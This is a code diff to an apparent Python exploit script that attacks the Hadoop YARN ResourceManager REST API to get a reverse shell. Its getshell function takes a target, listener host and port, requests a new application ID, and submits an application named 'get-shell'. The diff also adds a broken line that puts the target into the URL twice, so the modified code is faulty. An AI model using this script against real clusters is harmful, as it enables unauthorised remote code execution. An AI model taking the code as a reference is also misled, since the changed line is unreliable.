@@ -10,7 +10,8 @@ version  : Python 3.10
 import requests
 import argparse
 
-payload = 'ws/v1/cluster/apps/new-application'
+payload1 = 'ws/v1/cluster/apps/new-application'
+payload2 = 'ws/v1/cluster/apps'
 print(
         f"Author: Wodelilian\n"
         f"                                                     ,--,              ,--,                                    \n"
@@ -36,10 +37,10 @@ def getshell(target,lhost,lport):
     :param lport: 反弹shell 端口
     :return: null
     """
-    url = str(target) + str(payload)
+    url = str(target) + str(payload1)
     resp = requests.post(url)
     app_id = resp.json()['application-id']
-    url = target + 'ws/v1/cluster/apps'
+    url = target + str(target) + str(payload2)
     data = {
         'application-id': app_id,
         'application-name': 'get-shell',
